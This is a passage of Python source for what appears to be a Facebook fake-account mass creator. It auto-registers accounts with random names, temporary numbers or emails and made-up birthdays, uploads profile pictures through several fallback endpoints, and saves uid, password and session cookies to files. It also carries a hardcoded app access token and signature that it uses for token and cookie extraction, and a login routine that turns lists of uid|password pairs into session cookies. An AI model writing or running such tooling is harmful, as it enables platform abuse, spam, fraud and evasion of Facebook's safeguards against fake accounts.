    }
    try:
        _urls=[
            f"{_c7}/profile/picture/upload/?profile_id={uid}",
            f"{_c7}/profile/picture/upload/",
            f"{_c7}/{uid}/picture/upload/",
        ]
        for _url in _urls:
            try:
                _pg=ses.get(_url,headers=_ua,timeout=15,allow_redirects=True)
                if _pg.status_code not in(200,301,302):continue
                _sp=BeautifulSoup(_pg.text,"html.parser")
                _form=_sp.find("form",attrs={"enctype":re.compile(r"multipart",re.I)})
                if not _form:
                    _form=_sp.find("form")
                if not _form:continue
                _action=_form.get("action","")
                if not _action:continue
                _post_url=_build_full_url(_action,_c7)
                _hidden=_extract_form_fields(_form)
                _files={"file1":(f"pfp.{ext}",img,ct)}
                _r=ses.post(_post_url,data=_hidden,files=_files,headers=_ua,timeout=25,allow_redirects=True)
                if _r.status_code in(200,301,302):
                    _body=_r.text
                    if any(x in _body for x in["profile","picture","timeline","c_user","Your photo","photo has been"]):
                        return True
                    if _r.status_code in(301,302):
                        _loc=_r.headers.get("Location","")
                        if any(x in _loc for x in["profile","timeline","picture"]):
                            return True
            except Exception:
                continue
    except Exception:
        pass
    return False

def _pfp_method_mobile(ses:requests.Session,uid:str,img:bytes,ct:str,ext:str)->bool:
    """Method B: m.facebook.com touch profile photo upload"""
    _ua={
        "User-Agent":"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9",
        "Accept-Encoding":"gzip, deflate",
        "Connection":"keep-alive",
    }
    _base="https://m.facebook.com"
    try:
        _pg=ses.get(f"{_base}/profile.php?id={uid}&v=photos",headers=_ua,timeout=15)
        _sp=BeautifulSoup(_pg.text,"html.parser")
        _form=_sp.find("form",attrs={"enctype":re.compile(r"multipart",re.I)})
        if not _form:
            _pg2=ses.get(f"{_base}/{uid}",headers=_ua,timeout=15)
            _sp2=BeautifulSoup(_pg2.text,"html.parser")
            _form=_sp2.find("form",attrs={"enctype":re.compile(r"multipart",re.I)})
        if not _form:return False
        _action=_form.get("action","")
        if not _action:return False
        _post_url=_build_full_url(_action,_base)
        _hidden=_extract_form_fields(_form)
        _files={"file1":(f"pfp.{ext}",img,ct)}
        _r=ses.post(_post_url,data=_hidden,files=_files,headers=_ua,timeout=25,allow_redirects=True)
        return _r.status_code in(200,301,302)and("profile"in _r.text or"picture"in _r.text)
    except Exception:
        return False

def _pfp_method_graph(ses:requests.Session,uid:str,img:bytes,ct:str,ext:str,cki:dict)->bool:
    """Method C: graph.facebook.com photo upload via access token extraction"""
    try:
        _xs=cki.get("xs","")
        _cu=cki.get("c_user","")
        if not _xs or not _cu:return False
        _ua_s="FBAN/Orca-Android;FBAV/328.0.0.0.0;FBPN/com.facebook.orca;FBLC/en_US;FBCR/;FBBV/68061126;FBDV/SM-G991B;FBSV/11.0;FBCA/arm64-v8a;FBDM/{density=2.625,width=1080,height=2340};FB_FW/1;"
        _tok_url=f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%7C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={_cu}&locale=en_US&password=token_extract&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm"
        _r=ses.get(_tok_url,headers={"User-Agent":_ua_s},timeout=10)
        _d=_r.json()if _r.status_code==200 else{}
        _token=_d.get("access_token","")
        if not _token:return False
        _gr_url=f"https://graph.facebook.com/me/photos?type=profile&access_token={_token}"
        _files={"source":(f"pfp.{ext}",img,ct)}
        _gr=requests.post(_gr_url,files=_files,timeout=20)
        return _gr.status_code==200 and"id"in(_gr.json()if _gr.headers.get("Content-Type","").startswith("application/json")else{})
    except Exception:
        return False

def set_profile_picture(ses:requests.Session,uid:str,cookies_dict:dict)->bool:
    """
    Multi-method PFP setter.
    Tries mbasic form upload -> mobile form upload -> graph api.
    Session carries cookies automatically from registration.
    """
    _pfp_url=random.choice(PFP_URLS)
    try:
        _ir=requests.get(_pfp_url,timeout=15,allow_redirects=True)
        if _ir.status_code!=200 or len(_ir.content)<500:
            return False
        _img=_ir.content
        _ct=_ir.headers.get("Content-Type","image/jpeg").split(";")[0].strip()
        if not _ct.startswith("image"):_ct="image/jpeg"
        _ext="jpg"if("jpeg"in _ct or "jpg"in _ct)else("png"if"png"in _ct else"jpg")

        if _pfp_method_mbasic(ses,uid,_img,_ct,_ext):
            return True
        time.sleep(1)
        if _pfp_method_mobile(ses,uid,_img,_ct,_ext):
            return True
        time.sleep(1)
        if _pfp_method_graph(ses,uid,_img,_ct,_ext,cookies_dict):
            return True
        return False
    except Exception as _ex:
        logging.debug(f"PFP error: {_ex}")
        return False

# -- PFP retry wrapper (3 attempts, increasing delay) -------
def _pfp_with_retry(ses,uid,cki,retries=3)->bool:
    for _attempt in range(retries):
        try:
            _res=set_profile_picture(ses,uid,cki)
            if _res:
                return True
            time.sleep(1.5*(_attempt+1))
        except Exception:
            time.sleep(2)
    return False

# ============================================================
#  FB PROFILE PIC CHECK
# ============================================================
def check_facebook_profile_picture(uid:str)->str:
    _pic=f"https://graph.facebook.com/{uid}/picture?type=normal"
    _hdr={"User-Agent":"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"}
    try:
        _r=requests.get(_pic,headers=_hdr,allow_redirects=False,timeout=10)
        if _r.status_code==302:
            _loc=_r.headers.get("Location","")
            return"live"if"scontent"in _loc else"not_live"
        return None
    except requests.RequestException:
        return None

# ============================================================
#  PREMIUM UI  (no emojis — pure ASCII/Unicode icons)
# ============================================================
_TOP   ="  ╔══════════════════════════════════════════════════════════╗"
_BOT   ="  ╚══════════════════════════════════════════════════════════╝"
_MID   ="  ╠══════════════════════════════════════════════════════════╣"
_SEP   ="  ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌"
_ROW   ="  ║"
_HALF  ="  ╟──────────────────────────────────────────────────────────╢"

def _pad(s:str,width:int=52)->str:
    _v=re.sub(r'\033\[[0-9;]*m','',s)
    _diff=width-len(_v)
    return s+' '*max(0,_diff)

def banner():
    clear_screen()
    _ip=get_public_ip()
    _dt=get_datetime()
    print(f"""\033[38;5;46m
  ╔══════════════════════════════════════════════════════════╗
  ║                                                          ║
  ║  \033[1m\033[38;5;46m  █████╗ ██╗   ██╗\033[38;5;51m██████╗      \033[38;5;82m███████╗███╗   ███╗\033[38;5;46m   ║
  ║  \033[38;5;46m ██╔══██╗██║   ██║\033[38;5;51m╚════██╗     \033[38;5;82m██╔════╝████╗ ████║\033[38;5;46m   ║
  ║  \033[38;5;46m ███████║██║   ██║\033[38;5;51m █████╔╝     \033[38;5;82m█████╗  ██╔████╔██║\033[38;5;46m   ║
  ║  \033[38;5;46m ██╔══██║██║   ██║\033[38;5;51m██╔═══╝      \033[38;5;82m██╔══╝  ██║╚██╔╝██║\033[38;5;46m   ║
  ║  \033[38;5;46m ██║  ██║╚██████╔╝\033[38;5;51m███████╗     \033[38;5;82m██║     ██║ ╚═╝ ██║\033[38;5;46m   ║
  ║  \033[38;5;46m ╚═╝  ╚═╝ ╚═════╝ \033[38;5;51m╚══════╝     \033[38;5;82m╚═╝     ╚═╝     ╚═╝\033[38;5;46m   ║
  ║                                                          ║
  ║  \033[0m\033[38;5;51m\033[1m  [  AUTO  CREATE  ]   ACCOUNT  CREATOR  /  2FA  /  COOKIES  \033[0m\033[38;5;46m║
  ╠══════════════════════════════════════════════════════════╣
  ║  \033[38;5;226m\033[1m [*] TOOL   \033[0m\033[38;5;46m│\033[0m\033[97m  AU2 FM MAKER  ·  PREMIUM EDITION  v3.1\033[38;5;46m  ║
  ║  \033[38;5;51m\033[1m [*] IP     \033[0m\033[38;5;46m│\033[0m\033[97m  {_ip:<44}\033[38;5;46m  ║
  ║  \033[38;5;82m\033[1m [*] TIME   \033[0m\033[38;5;46m│\033[0m\033[97m  {_dt:<44}\033[38;5;46m  ║
  ║  \033[38;5;46m\033[1m [*] STATUS \033[0m\033[38;5;46m│\033[0m\033[92m  ACTIVE  ·  ONLINE  ·  READY               \033[38;5;46m  ║
  ╚══════════════════════════════════════════════════════════╝\033[0m""")

def linex():
    print(f"{GOLD}{_SEP}{RESET}")

def section(title:str,icon:str="◈"):
    print(f"\n{GOLD}  ╔══ {icon}  {BOLD}{W}{title}{RESET}{GOLD}  ══╗{RESET}")

def row(key,label,icon="▸"):
    print(f"{D}  {_ROW}  {TEAL}{BOLD}[{key}]{RESET}  {icon}  {W}{label}{RESET}")

def prompt(msg:str,icon:str="▶")->str:
    return input(f"{GOLD}  {icon} {TEAL}{BOLD}{msg}{W} :{G} {RESET}")

def success(msg:str,icon:str="[+]"):
    print(f"{G}  {BOLD}{icon}  {msg}{RESET}")

def warn(msg:str,icon:str="[!]"):
    print(f"{Y}  {icon}  {msg}{RESET}")

def error(msg:str,icon:str="[-]"):
    print(f"{R}  {BOLD}{icon}  {msg}{RESET}")

def info(msg:str,icon:str="[*]"):
    print(f"{C}  {icon}  {msg}{RESET}")

def divider():
    print(f"{D}  {'─'*58}{RESET}")

def account_box(fields:dict):
    print(f"{GOLD}  ┌── ACCOUNT CREATED {'─'*35}{RESET}")
    _icons={
        'Name'  :'[NAME]',
        'Number':'[NUM] ',
        'Email' :'[MAIL]',
        'Gender':'[SEX] ',
        'DOB'   :'[DOB] ',
        'UID'   :'[UID] ',
        'PASS'  :'[PWD] ',
        'PFP'   :'[PFP] ',
        'OTP'   :'[OTP] ',
    }
    for _k,_v in fields.items():
        _ic=_icons.get(_k,'[---]')
        print(f"{GOLD}  │  {G}{BOLD}{_ic}{W}  {D}:{W}  {TEAL}{_v}{RESET}")
    print(f"{GOLD}  └{'─'*57}{RESET}")

def mini_ok(uid:str,extra:str,pfp_ok:bool):
    _ptag=f"{G}[PFP:OK]{RESET}"if pfp_ok else f"{Y}[PFP:--]{RESET}"
    print(f"\r{GOLD}  [+] {TEAL}{uid}{W}  {D}|{W}  {extra}  {_ptag}{RESET}")

def progress_line(ok:int,cp:int,total:int,current:int):
    sys.stdout.write(f"\r{GOLD}  [>] {W}{current}/{total}  {G}OK:{ok}  {R}CP:{cp}  {RESET}  ")
    sys.stdout.flush()

# ============================================================
#  GLOBAL COUNTERS
# ============================================================
oks:List[str]=[]
cps:List[str]=[]

# -- obfuscated counter state --------------------------------
_0k_xor=0xABCD
_cp_xor=0xDCBA
_ok_enc=lambda n:n^_0k_xor
_cp_enc=lambda n:n^_cp_xor
_ok_dec=lambda n:n^_0k_xor
_cp_dec=lambda n:n^_cp_xor
_stats_ok=0;_stats_cp=0
def _inc_ok()->None:
    global _stats_ok
    _stats_ok=_ok_enc(_ok_dec(_stats_ok)+1)
def _inc_cp()->None:
    global _stats_cp
    _stats_cp=_cp_enc(_cp_dec(_stats_cp)+1)
# -----------------------------------------------------------

# ============================================================
#  METHOD 3  (Enhanced Registration)
# ============================================================
def createfb_method_3():
    global oks,cps
    banner()
    section("CONTACT TYPE","[>>]")
    row(1,"TEMP NUMBER","  ■")
    row(2,"TEMP MIX NUMBER","  ■")
    row(3,"TEMP MAIL","  ■")
    divider()
    _ec=prompt("CHOOSE CONTACT")
    divider()
    section("NAME SOURCE","[>>]")
    row(1,"RANDOM SINGLE NAME","  ■")
    divider()
    _nc=prompt("CHOOSE NAME")
    divider()
    try:
        _num=int(prompt("HOW MANY ACCOUNTS","[?]"))
        if _num<=0:raise ValueError
    except ValueError:
        error("Enter a valid positive number"); return
    divider()
    section("PASSWORD","[>>]")
    row(1,"AUTO PASSWORD","  ■")
    row(2,"CUSTOM PASSWORD","  ■")
    divider()
    _pwc=prompt("CHOOSE PASSWORD")
    _pww=get_pass()if _pwc=='1'else prompt("ENTER PASSWORD")
    if not _pww:error("Password cannot be empty"); return
    divider()
    _sd=prompt("Show Full Details? (y/n)","[?]").lower()
    banner()
    success(f"ACCOUNT CREATION STARTED  ■  TOTAL: {R}{_num}{RESET}")
    warn(f"Recommended VPN : 1.1.1.1")
    linex()

    for _i in range(_num):
        try:
            progress_line(len(oks),len(cps),_num,_i+1)
            _ses=requests.Session()
            _resp=_ses.get(_c5)
            _form=extractor(_resp.text)
            _name=get_bd_name()

            if _ec=='1':_phone=get_bd_phone()
            elif _ec=='2':_phone=generate_phone_number()
            else:_phone=xiyadmailx_email()

            _pl={
                'ccp':"2",'reg_instance':_form.get("reg_instance",""),
                'submission_request':"true",'reg_impression_id':_form.get("reg_impression_id",""),
                'ns':"1",'logger_id':_form.get("logger_id",""),
                'firstname':_name,'lastname':_name,
                'birthday_day':str(random.randint(20,28)),
                'birthday_month':str(random.randint(5,12)),
                'birthday_year':str(random.randint(1990,2001)),
                'reg_email__':_phone,'sex':"1",
                'encpass':f'#PWD_BROWSER:0:{int(time.time())}:{_pww}',
                'submit':"Sign Up",'fb_dtsg':_form.get("fb_dtsg",""),
                'jazoest':_form.get("jazoest",""),'lsd':_form.get("lsd","")
            }
            _hdr={
                "Host":"m.facebook.com","Connection":"keep-alive",
                "User-Agent":ugenX(),
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-US,en;q=0.9"
            }
            _hdr2={
                'accept-encoding':'gzip, deflate','accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0','referer':'https://mbasic.facebook.com/reg/',
                'sec-ch-ua':'','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'Android',
                'sec-fetch-dest':'document','sec-fetch-mode':'navigate',
                'sec-fetch-site':'same-origin','sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1','user-agent':ugenX()
            }
            _mhdr={**_hdr,**_hdr2}
            _sub=_ses.post(_c6,data=_pl,headers=_mhdr)
            _cki=_ses.cookies.get_dict()

            if"c_user"in _cki:
                _uid=_cki["c_user"]
                _status=check_facebook_profile_picture(_uid)
                if _status=="live":
                    _cstr=";".join(f"{k}={v}"for k,v in _cki.items())
                    _pfp=_pfp_with_retry(_ses,_uid,_cki)
                    if _sd=='y':
                        account_box({'Name':_name,'Number':_phone,'Gender':'Female',
                            'DOB':f"{_pl['birthday_day']}-{_pl['birthday_month']}-{_pl['birthday_year']}",
                            'UID':_uid,'PASS':_pww,'PFP':('[PFP:OK]'if _pfp else '[PFP:--]')})
                        print(f"{D}  {_uid}|{_pww}|{_cstr}{RESET}")
                    else:
                        mini_ok(_uid,_pww,_pfp)
                    try:
                        with open('/sdcard/Auto_Creat.txt','a')as _f:
                            _f.write(f"{_uid}|{_pww}|{_cstr}\n")
                        oks.append(_uid)
                    except IOError:
                        oks.append(_uid)
                        continue
                else:
                    cps.append(_cki.get("c_user","?"))
            elif"checkpoint"in _cki:
                cps.append(_cki.get("c_user","checkpoint"))
            time.sleep(1)
        except Exception as _ex:
            time.sleep(10);continue

    print()
    linex()
    success("PROCESS COMPLETED")
    linex()
    print(f"{G}  [+] Total OK  {D}|{G}  {BOLD}{len(oks)}{RESET}")
    print(f"{R}  [-] Total CP  {D}|{R}  {BOLD}{len(cps)}{RESET}")
    linex()
    input(f"\n{GOLD}  ◆  Done  ·  Press Enter to return to menu  ◆{RESET} ")
    master_menu(); return

# ============================================================
#  METHOD 2  (Pic-Verified Registration)
# ============================================================
def createfb_method_2():
    global oks,cps
    banner()
    section("CONTACT TYPE","[>>]")
    row(1,"TEMP NUMBER","  ■")
    row(2,"TEMP MIX NUMBER","  ■")
    row(3,"TEMP MAIL","  ■")
    divider()
    _ec=prompt("CHOOSE CONTACT")
    divider()
    section("NAME SOURCE","[>>]")
    row(1,"RANDOM SINGLE NAME","  ■")
    divider()
    _nc=prompt("CHOOSE NAME")
    divider()
    try:
        _num=int(prompt("HOW MANY ACCOUNTS","[?]"))
        if _num<=0:raise ValueError
    except ValueError:
        error("Enter a valid positive number"); return
    divider()
    section("PASSWORD","[>>]")
    row(1,"AUTO PASSWORD","  ■")
    row(2,"CUSTOM PASSWORD","  ■")
    divider()
    _pwc=prompt("CHOOSE PASSWORD")
    _pww=get_pass()if _pwc=='1'else prompt("ENTER PASSWORD")
    if not _pww:error("Password cannot be empty"); return
    divider()
    _sd=prompt("Show Full Details? (y/n)","[?]").lower()
    banner()
    success(f"ACCOUNT CREATION STARTED  ■  TOTAL: {R}{_num}{RESET}")
    warn(f"Recommended VPN : 1.1.1.1")
    linex()

    for _i in range(_num):
        try:
            progress_line(len(oks),len(cps),_num,_i+1)
            _ses=requests.Session()
            _resp=_ses.get(_c5)
            _form=extractor(_resp.text)
            _name=get_bd_name()

            if _ec=='1':_phone=get_bd_phone()
            elif _ec=='2':_phone=generate_phone_number()
            else:_phone=xiyadmailx_email()

            _pl={
                'ccp':"2",'reg_instance':_form.get("reg_instance",""),
                'submission_request':"true",'reg_impression_id':_form.get("reg_impression_id",""),
                'ns':"1",'logger_id':_form.get("logger_id",""),
                'firstname':_name,'lastname':_name,
                'birthday_day':str(random.randint(20,28)),
                'birthday_month':str(random.randint(5,12)),
                'birthday_year':str(random.randint(1990,2001)),
                'reg_email__':_phone,'sex':"1",
                'encpass':f'#PWD_BROWSER:0:{int(time.time())}:{_pww}',
                'submit':"Sign Up",'fb_dtsg':_form.get("fb_dtsg",""),
                'jazoest':_form.get("jazoest",""),'lsd':_form.get("lsd","")
            }
            _hdr={
                "Host":"m.facebook.com","Connection":"keep-alive","User-Agent":ugenX(),
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-US,en;q=0.9"
            }
            _hdr2={
                'accept-encoding':'gzip, deflate','accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0','referer':'https://mbasic.facebook.com/reg/',
                'sec-ch-ua':'','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'Android',
                'sec-fetch-dest':'document','sec-fetch-mode':'navigate',
                'sec-fetch-site':'same-origin','sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1','user-agent':ugenX()
            }
            _sub=_ses.post(_c6,data=_pl,headers={**_hdr,**_hdr2})
            _cki=_ses.cookies.get_dict()

            if"c_user"in _cki:
                _uid=_cki["c_user"]
                _status=check_facebook_profile_picture(_uid)
                if _status=="live":
                    _cstr=";".join(f"{k}={v}"for k,v in _cki.items())
                    _pfp=_pfp_with_retry(_ses,_uid,_cki)
                    if _sd=='y':
                        account_box({'Name':_name,'Number':_phone,'Gender':'Female',
                            'DOB':f"{_pl['birthday_day']}-{_pl['birthday_month']}-{_pl['birthday_year']}",
                            'UID':_uid,'PASS':_pww,'PFP':('[PFP:OK]'if _pfp else '[PFP:--]')})
                        print(f"{D}  {_uid}|{_pww}|{_cstr}{RESET}")
                    else:
                        mini_ok(_uid,_pww,_pfp)
                    try:
                        with open('/sdcard/Auto_Creat.txt','a')as _f:
                            _f.write(f"{_uid}|{_pww}\n")
                        oks.append(_uid)
                    except IOError:
                        oks.append(_uid)
                        continue
                else:
                    cps.append(_cki.get("c_user","?"))
            elif"checkpoint"in _cki:
                cps.append(_cki.get("c_user","checkpoint"))
            time.sleep(1)
        except Exception:
            time.sleep(10);continue

    print()
    linex()
    success("PROCESS COMPLETED")
    linex()
    print(f"{G}  [+] Total OK  {D}|{G}  {BOLD}{len(oks)}{RESET}")
    print(f"{R}  [-] Total CP  {D}|{R}  {BOLD}{len(cps)}{RESET}")
    linex()
    input(f"\n{GOLD}  ◆  Done  ·  Press Enter to return to menu  ◆{RESET} ")
    master_menu(); return

# ============================================================
#  METHOD 1  (Basic Registration)
# ============================================================
def createfb_method_1():
    global oks,cps
    banner()
    section("CONTACT TYPE","[>>]")
    row(1,"TEMP NUMBER","  ■")
    row(2,"TEMP MIX NUMBER","  ■")
    row(3,"TEMP MAIL","  ■")
    divider()
    _ec=prompt("CHOOSE CONTACT")
    divider()
    section("NAME SOURCE","[>>]")
    row(1,"RANDOM SINGLE NAME","  ■")
    divider()
    _nc=prompt("CHOOSE NAME")
    divider()
    _num=int(prompt("HOW MANY ACCOUNTS","[?]"))
    divider()
    section("PASSWORD","[>>]")
    row(1,"AUTO PASSWORD","  ■")
    row(2,"CUSTOM PASSWORD","  ■")
    divider()
    _pwc=prompt("CHOOSE PASSWORD")
    _pww=get_pass()if _pwc=='1'else prompt("ENTER PASSWORD")
    divider()
    _sd=prompt("Show Full Details? (y/n)","[?]").lower()
    banner()
    success(f"ACCOUNT CREATION STARTED  ■  TOTAL: {R}{_num}{RESET}")
    warn("Recommended VPN : 1.1.1.1")
    linex()

    for _i in range(_num):
        try:
            progress_line(len(oks),len(cps),_num,_i+1)
            _ses=requests.Session()
            _resp=_ses.get(_c5)
            _form=extractor(_resp.text)
            _name=get_bd_name()

            if _ec=='1':_phone=get_bd_phone()
            elif _ec=='2':_phone=generate_phone_number()
            else:_phone=xiyadmailx_email()

            _pl={
                'ccp':"2",'reg_instance':_form.get("reg_instance",""),
                'submission_request':"true",'reg_impression_id':_form.get("reg_impression_id",""),
                'ns':"1",'logger_id':_form.get("logger_id",""),
                'firstname':_name,'lastname':_name,
                'birthday_day':str(random.randint(15,25)),
                'birthday_month':str(random.randint(5,10)),
                'birthday_year':str(random.randint(1985,1995)),
                'reg_email__':_phone,'sex':"1",
                'encpass':f'#PWD_BROWSER:0:{int(time.time())}:{_pww}',
                'submit':"Sign Up",'fb_dtsg':_form.get("fb_dtsg",""),
                'jazoest':_form.get("jazoest",""),'lsd':_form.get("lsd","")
            }
            _hdr={
                "Host":"m.facebook.com","Connection":"keep-alive","User-Agent":ugenX(),
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-US,en;q=0.9"
            }
            _hdr2={
                'accept-encoding':'gzip, deflate','accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0','referer':'https://mbasic.facebook.com/reg/',
                'sec-ch-ua':'','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'Android',
                'sec-fetch-dest':'document','sec-fetch-mode':'navigate',
                'sec-fetch-site':'same-origin','sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1','user-agent':ugenX()
            }
            _sub=_ses.post(_c6,data=_pl,headers={**_hdr,**_hdr2})
            _cki=_ses.cookies.get_dict()

            if"c_user"in _cki:
                _cstr=";".join(f"{k}={v}"for k,v in _cki.items())
                _uid=_cki["c_user"]
                _pfp=_pfp_with_retry(_ses,_uid,_cki)
                if _sd=='y':
                    account_box({'Name':_name,'Number':_phone,'Gender':'Female',
                        'DOB':f"{_pl['birthday_day']}-{_pl['birthday_month']}-{_pl['birthday_year']}",
                        'UID':_uid,'PASS':_pww,'PFP':('[PFP:OK]'if _pfp else '[PFP:--]')})
                    print(f"{D}  {_uid}|{_pww}|{_cstr}{RESET}")
                else:
                    mini_ok(_uid,_pww,_pfp)
                try:
                    with open('/sdcard/Auto_Creat.txt','a')as _f:
                        _f.write(f"{_uid}|{_pww}\n")
                except Exception:
                    pass
                oks.append(_uid)
            elif"checkpoint"in _cki:
                cps.append(_cki.get("c_user","checkpoint"))
            time.sleep(1)
        except Exception:
            time.sleep(10);pass

    print()
    linex()
    success("PROCESS COMPLETED")
    linex()
    print(f"{G}  [+] Total OK  {D}|{G}  {BOLD}{len(oks)}{RESET}")
    print(f"{R}  [-] Total CP  {D}|{R}  {BOLD}{len(cps)}{RESET}")
    linex()
    input(f"\n{GOLD}  ◆  Done  ·  Press Enter to return to menu  ◆{RESET} ")
    master_menu(); return

# ============================================================
#  2FA MANAGER
# ============================================================
def get_default_password()->Optional[str]:
    _fp=os.path.expanduser("/sdcard/AU2/2FA/default_password.txt")
    if os.path.exists(_fp):
        with open(_fp,"r")as _f:
            return _f.read().strip()
    return None

def set_default_password():
    try:
        banner()
        if get_default_password():
            info("Default password already set.")
            _ch=prompt("Change it? (y/n)").strip().lower()
            if _ch!='y':
                input(f"{GOLD}  ▶ Press Enter to continue{RESET} ");return
        _pw=prompt("Enter default password")
        if not _pw:
            error("Password cannot be empty")
            input(f"{GOLD}  ▶ Press Enter to continue{RESET} ");return
        _fp=os.path.expanduser("/sdcard/AU2/2FA/default_password.txt")
        os.makedirs(os.path.dirname(_fp),exist_ok=True)
        with open(_fp,"w")as _f:
            _f.write(_pw)
        success("Default password saved.")
        input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")
        main_menu()
    except Exception as _e:
        error(f"Error: {_e}")
        input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")
        main_menu()

def just_2fa():
    try:
        banner()
        _sk=prompt("2FA Secret Key","[KEY]").strip().replace(" ","")
        _totp=pyotp.TOTP(_sk)
        info(f"2FA Generator  ▸  Press Ctrl+C to stop")
        linex()
        while True:
            _code=_totp.now()
            _rem=30-(int(time.time())%30)
            print(f"\r{GOLD}  [KEY]  {W}{BOLD}{_code}{RESET}  {D}|{G}  Refreshes in {W}{_rem:2d}s  ",end='',flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        linex()
        warn("Stopped.")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        just_2fa()
    except Exception:
        error("Error occurred")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        main_menu()

def save_2fa():
    try:
        banner()
        _pw=get_default_password()
        if not _pw:
            error("No default password set. Set one first.")
            input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
            main_menu();return
        _uid=prompt("Enter UID","[UID]").strip()
        _sk=prompt("2FA Secret Key","[KEY]").strip().replace(" ","")
        _totp=pyotp.TOTP(_sk)
        _fp=os.path.expanduser("/sdcard/Id_Auto_Creat.txt")
        os.makedirs(os.path.dirname(_fp),exist_ok=True)
        with open(_fp,'a')as _f:
            _f.write(f"{_uid}|{_pw}|{_sk}\n")
        _kp=os.path.expanduser("/sdcard/AU2/2FA/2fa_key.txt")
        os.makedirs(os.path.dirname(_kp),exist_ok=True)
        with open(_kp,"w")as _f:
            _f.write(_sk)
        success("Saved.")
        info("2FA Generator  ▸  Press Ctrl+C to stop")
        linex()
        while True:
            _code=_totp.now()
            _rem=30-(int(time.time())%30)
            print(f"\r{GOLD}  [KEY]  {W}{BOLD}{_code}{RESET}  {D}|{G}  Refreshes in {W}{_rem:2d}s  ",end='',flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        linex()
        warn("Stopped.")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        save_2fa()
    except Exception as _e:
        error(f"Error: {_e}")
        input(f"{GOLD}  ▶ Press Enter to go back{RESET} ")
        main_menu()

def main_menu():
    while True:
        banner()
        print(f"{GOLD}{_TOP}{RESET}")
        print(f"{GOLD}{_ROW}  {PINK}{BOLD}  ◆  2FA MANAGER                                  {RESET}{GOLD}  {_ROW}{RESET}")
        print(f"{GOLD}{_MID}{RESET}")
        row(1,"Just 2FA Generator","  ■")
        row(2,"2FA + Save UID | Pass | Key","  ■")
        row(3,"Set Default Password","  ■")
        row(0,"Back to Main Menu","  ■")
        print(f"{GOLD}{_BOT}{RESET}")
        linex()
        _ch=prompt("SELECT OPTION","▶").strip()
        if _ch=='1':just_2fa()
        elif _ch=='2':save_2fa()
        elif _ch=='3':set_default_password()
        elif _ch=='0':break
        else:
            error("Invalid option")
            input(f"{GOLD}  ▶ Press Enter to continue{RESET} ")

# ============================================================
#  MISSING / TOOLS
# ============================================================
def missing():
    banner()
    warn("MISSING  ▸  COMING SOON")

# ============================================================
#  COOKIE EXTRACTOR
# ============================================================
_ok_count=0;_cp_count=0;_loop=0;_tl=0

def check_write_permissions(fp:str)->bool:
    try:
        with open(fp,'a'):return True
    except IOError:return False

def login_ids(file_path:str):
    global _ok_count,_cp_count,_loop,_tl
    _sf='/sdcard/uid_pass_cookies.txt'
    _cf='/sdcard/Cps_ex.txt'
    if not check_write_permissions(_sf) or not check_write_permissions(_cf):
        error("No write permission for /sdcard/");return
    if not os.path.exists(file_path):
        error(f"File not found: {file_path}");return
    with open(file_path,'r')as _f:
        _lines=[_l.strip()for _l in _f if _l.strip()]
    _tl=len(_lines)
    if _tl==0:error(f"File is empty: {file_path}");return

    banner()
    info(f"TOTAL IDs  :  {R}{_tl}{RESET}")
    info(f"FILE       :  {W}{os.path.basename(file_path)}{RESET}")
    linex()

    _ses=requests.Session()
    _ses.headers.update({'User-Agent':'FBAN/Orca-Android;FBAV/327.0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/SM-A8100;FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;'})

    for _line in _lines:
        _loop+=1
        try:
            if'|'not in _line:continue
            _uid,_pw=_line.split('|',1)
            _url=f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email={_uid}&locale=en_US&password={_pw}&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm"
            _r=_ses.get(_url,timeout=10)
            _d=_r.json()
            if'session_cookies'in _d:
                _cr=_d['session_cookies']
                _coki=";".join(f"{_ii['name']}={_ii['value']}"for _ii in _cr)
                print(f"\r{GOLD}  [+] {TEAL}{_uid}{W}|{G}{_pw}{W}|{D}{_coki[:40]}...{RESET}")
                with open(_sf,'a')as _s:
                    _s.write(f"{_uid}|{_pw}|{_coki}\n")
                _ok_count+=1
